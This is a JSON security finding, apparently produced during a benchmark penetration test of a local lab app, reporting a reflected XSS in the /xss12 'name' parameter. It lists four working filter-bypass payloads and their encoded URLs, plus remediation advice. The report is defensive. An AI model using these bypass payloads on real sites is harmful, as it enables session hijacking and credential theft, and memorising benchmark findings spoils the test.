{
  "title": "Reflected XSS Vulnerability with Blacklist Filter Bypass in name Parameter",
  "severity": "HIGH",
  "description": "The /xss12 endpoint is vulnerable to reflected Cross-Site Scripting (XSS) attacks through the 'name' parameter. Despite implementing a blacklist filter that blocks keywords like 'script', 'onload', 'onclick', 'onmouseover', single quotes, and forward slashes, the application is vulnerable to XSS through alternative event handlers (onerror, ontouchstart, onmousemove) and encoding bypasses.\n\nThe blacklist filter can be bypassed by:\n1. Using event handlers not explicitly blocked (onerror, ontouchstart, onmousemove)\n2. Inserting spaces within blocked event handler names (e.g., 'o n l o a d')\n3. Using alternative HTML tags like <img> and <svg> without requiring forward slash characters",
  "impact": "An attacker can inject malicious JavaScript that will execute in the browser of any user who visits a crafted URL containing XSS payload. This can lead to session hijacking, credential theft, malware distribution, website defacement, or unauthorized actions on behalf of the victim user.",
  "endpoint": "http://localhost:5000/xss12",
  "evidence": "POC execution confirmed all bypass techniques:\n\n[Test 1] onerror event handler (not in blacklist):\n- Payload: &lt;img src=x onerror=alert(1)&gt;\n- Result: ✓ VULNERABLE - payload reflected in response\n- URL: http://localhost:5000/xss12?name=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E\n\n[Test 2] Space-separated onload bypass:\n- Payload: &lt;svg o n l o a d=alert(1)&gt;\n- Result: ✓ VULNERABLE - bypasses 'onload' filter by inserting spaces\n- URL: http://localhost:5000/xss12?name=%3Csvg%20o%20n%20l%20o%20a%20d%3Dalert(1)%3E\n\n[Test 3] ontouchstart event handler:\n- Payload: &lt;img ontouchstart=alert(1)&gt;\n- Result: ✓ VULNERABLE - reflected in response\n- URL: http://localhost:5000/xss12?name=%3Cimg%20ontouchstart%3Dalert(1)%3E\n\n[Test 4] onmousemove event handler:\n- Payload: &lt;img onmousemove=alert(1)&gt;\n- Result: ✓ VULNERABLE - reflected in response\n- URL: http://localhost:5000/xss12?name=%3Cimg%20onmousemove%3Dalert(1)%3E\n\nAll payloads successfully bypass the blacklist filter and are reflected in the application response without proper encoding/sanitization.",
  "pocPath": "pocs/poc_xss_blacklist_bypass_xss12.sh",
  "remediation": "1. Replace blacklist approach with whitelist validation - only allow known safe characters\n2. Use proper output encoding/escaping based on context (HTML escape special characters using htmlspecialchars, htmlentities, or equivalent)\n3. Use a robust HTML sanitization library (e.g., DOMPurify for JavaScript, htmlspecialchars/htmlentities for PHP, OWASP Java Encoder)\n4. Implement Content Security Policy (CSP) headers to restrict inline script execution and control script sources\n5. Apply HTML entity encoding to all user input displayed in HTML context\n6. Use HttpOnly and Secure flags on cookies to prevent XSS from stealing session tokens\n7. Implement proper input validation to reject or encode HTML tags and special characters\n8. Consider using a template engine with automatic escaping enabled by default",
  "references": "OWASP A03:2021 - Injection, CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting'), OWASP XSS Prevention Cheat Sheet, OWASP Top 10",
  "toolCallDescription": "Document reflected XSS vulnerability in /xss12 with confirmed POC demonstrating blacklist filter bypass",
  "timestamp": "2025-11-06T21:34:12.697Z",
  "sessionId": "benchmark-XBEN-051-24-mhnxsg1t",
  "target": "./repo"
}